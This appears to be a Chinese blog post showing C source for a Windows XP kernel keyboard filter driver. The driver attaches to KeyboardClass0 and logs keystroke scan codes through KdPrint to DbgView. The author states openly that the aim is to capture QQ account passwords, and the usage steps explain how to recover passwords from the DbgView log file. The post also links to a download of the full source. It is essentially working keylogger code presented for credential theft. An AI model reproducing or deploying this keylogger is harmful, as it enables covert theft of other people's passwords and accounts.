@@ -1,0 +1,105 @@
+最近看了看c++，写个程序玩玩。因为用户态代码不好截取到qq密码，写个键盘分层驱动。试了试效果还可以。
+
+
+
+
+
+开发环境   vs2008 winddk ddkwizard       windowsxp      Dbgview
+
+
+
+ 实现方法
+
+1.把过滤驱动挂载到键盘驱动上面
+
+2.设置完成例程
+
+3.通过KdPrint输出键盘扫描码到DebugView
+
+4. 从DebugView的日志文件中读出键盘按键。
+
+
+
+
+
+具体代码
+
+1.把过滤驱动挂载到KeyBoardClass0上面
+
+PFILE_OBJECT fileOjbect;
+PDEVICE_OBJECT deviceObject;
+UNICODE_STRING deviceName;
+PDEVICE_EXTENSION pdx;
+PDEVICE_OBJECT filterDeviceObject;
+PDEVICE_OBJECT targetDevice;
+fileOjbect=NULL;
+RtlInitUnicodeString(&deviceName,L"\\Device\\KeyBoardClass0");
+status=IoGetDeviceObjectPointer(&deviceName,FILE_ALL_ACCESS,&fileOjbect,&deviceObject);
+pdoDeviceObj->Flags |= DO_BUFFERED_IO;
+pdx=(PDEVICE_EXTENSION)pdoDeviceObj->DeviceExtension;
+pdx->pDevice=pdoDeviceObj;
+pdx->ustrDeviceName=usDeviceName;
+filterDeviceObject=((PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension)->pDevice;
+targetDevice=IoAttachDeviceToDeviceStack(filterDeviceObject,deviceObject);
+((PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension)->TargetDevice=targetDevice;
+filterDeviceObject->DeviceType=targetDevice->DeviceType; 
+filterDeviceObject->Characteristics=targetDevice->Characteristics;
+filterDeviceObject->Flags&=~DO_DEVICE_INITIALIZING;
+filterDeviceObject->Flags|=(targetDevice->Flags&(DO_DIRECT_IO|DO_BUFFERED_IO));
+ObDereferenceObject(fileOjbect);
+return STATUS_SUCCESS;
+
+2.设置完成例程
+
+PDEVICE_EXTENSION pdx;
+pdx=(PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
+IoCopyCurrentIrpStackLocationToNext(Irp);
+IoSetCompletionRoutine(Irp,MyIoCompletion,NULL,TRUE,TRUE,TRUE);
+NTSTATUS status=IoCallDriver(pdx->TargetDevice,Irp);
+return  status;
+
+3.输出键盘按键的扫描码
+
+NTSTATUS MyIoCompletion(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp,IN PVOID Context)
+{
+if(NT_SUCCESS(Irp->IoStatus.Status))
+{
+PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
+if(keys->Flags==0x0001||keys->Flags==0x0003)
+KdPrint(("%02x",keys->MakeCode));
+}
+if(Irp->PendingReturned)
+{
+IoMarkIrpPending(Irp);
+}
+return STATUS_SUCCESS;
+
+}
+
+
+
+使用步骤
+
+1.安装驱动
+
+用DriverMonitor加载并运行Driver1.sys驱动文件
+
+
+
+2.打开Dbgview，当按键时就可以看到dbgview中记录下的键盘扫描码
+
+
+
+3.在dbgview中选择记录日志文件，处理下日志文件就可以得到qq密码了。
+
+
+
+
+
+偶c++菜鸟，欢迎大神们批评教育    不足的地方很多啊    多多交流     谢谢    邮箱328452421@qq.com   
+
+
+
+
+
+源码下载地址   http://download.csdn.net/detail/xiaoxiao108/4303441
